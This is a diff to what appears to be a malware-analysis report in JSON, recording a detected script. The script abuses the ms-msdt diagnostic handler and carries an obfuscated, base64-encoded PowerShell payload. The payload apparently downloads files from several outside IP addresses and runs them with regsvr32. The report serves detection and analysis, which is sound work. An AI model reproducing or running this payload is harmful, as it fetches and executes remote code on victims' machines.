@@ -4,6 +4,46 @@
     "score": 500,
     "sections": [
       {
+        "auto_collapse": true,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Script Entropies",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              5.2988,
+              4.59029,
+              4.00173,
+              4.60493
+            ]
+          },
+          "type": "colormap"
+        },
+        "body_config": {},
+        "body_format": "GRAPH_DATA",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Script: location.href = \"ms-msdt:/id PCWDiagnostic /skip f...",
+        "zeroize_on_tag_safe": false
+      },
+      {
         "auto_collapse": false,
         "body": "Redirection to:\nms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JABwACAAPQAgACQARQBuAHYAOgB0AGUAbQBwADsAaQB3AHIAIABoAHQAdABwADoALwAvADEAMAA0AC4AMwA2AC4AMgAyADkALgAxADMAOQAvACQAKAByAGEAbgBkAG8AbQApAC4AZABhAHQAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAXAB0AC4AQQA7AGkAdwByACAAaAB0AHQAcAA6AC8ALwA4ADUALgAyADMAOQAuADUANQAuADIAMgA4AC8AJAAoAHIAYQBuAGQAbwBtACkALgBkAGEAdAAgAC0ATwB1AHQARgBpAGwAZQAgACQAcABcAHQAMQAuAEEAOwBpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMANAAuADIANAA3AC4AMQAxADkALwAkACgAcgBhAG4AZABvAG0AKQAuAGQAYQB0ACAALQBPAHUAdABGAGkAbABlACAAJABwAFwAdAAyAC4AQQA7AHIAZQBnAHMAdgByADMAMgAgACQAcABcAHQALgBBADsAcgBlAGcAcwB2AHIAMwAyACAAJABwAFwAdAAxAC4AQQA7AHIAZQBnAHMAdgByADMAMgAgACQAcABcAHQAMgAuAEEA'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"",
         "body_config": {},
